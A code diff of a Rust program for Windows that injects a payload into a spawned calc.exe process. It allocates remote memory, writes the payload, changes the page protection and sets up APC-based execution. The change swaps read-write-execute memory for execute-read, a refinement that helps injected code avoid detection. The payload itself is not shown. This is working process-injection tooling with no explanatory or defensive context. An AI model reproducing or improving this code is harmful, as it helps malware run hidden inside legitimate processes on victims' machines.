@@ -6,11 +6,12 @@ use windows::{
         System::{
             Diagnostics::Debug::{DebugActiveProcessStop, WriteProcessMemory},
             Memory::{
-                VirtualAllocEx, VirtualProtectEx, MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READWRITE,
-                PAGE_PROTECTION_FLAGS, PAGE_READWRITE,
+                VirtualAllocEx, VirtualProtectEx, MEM_COMMIT, MEM_RESERVE, 
+                PAGE_EXECUTE_READ, PAGE_PROTECTION_FLAGS, PAGE_READWRITE,
             },
             Threading::{
-                CreateProcessA, CreateRemoteThread, QueueUserAPC, SleepEx, DEBUG_PROCESS, INFINITE,
+                CreateProcessA, CreateRemoteThread, QueueUserAPC, 
+                SleepEx, DEBUG_PROCESS, INFINITE,
                 PROCESS_INFORMATION, STARTUPINFOA,
             },
         },
@@ -44,10 +45,9 @@ fn main() -> Result<(), Box<dyn std::error::Error>> {
     unsafe {
         let mut si = STARTUPINFOA::default();
         let mut pi = PROCESS_INFORMATION::default();
-
-        let _process = CreateProcessA(
+        CreateProcessA(
             None,
-            PSTR(s!("C:\\Windows\\System32\\calc.exe").as_ptr().cast_mut()), // File path
+            PSTR(s!("C:\\Windows\\System32\\calc.exe").as_ptr().cast_mut()),
             None,
             None,
             false,
@@ -81,7 +81,7 @@ fn main() -> Result<(), Box<dyn std::error::Error>> {
             hprocess,
             address,
             payload.len(),
-            PAGE_EXECUTE_READWRITE,
+            PAGE_EXECUTE_READ,
             &mut oldprotect,
         )?;
 
@@ -96,8 +96,8 @@ fn main() -> Result<(), Box<dyn std::error::Error>> {
     Ok(())
 }
 
+/// Dummy thread entry function that blocks on `SleepEx`, waiting for an APC to trigger.
 unsafe extern "system" fn function(_param: *mut c_void) -> u32 {
     SleepEx(INFINITE, true);
-
     return 0;
 }
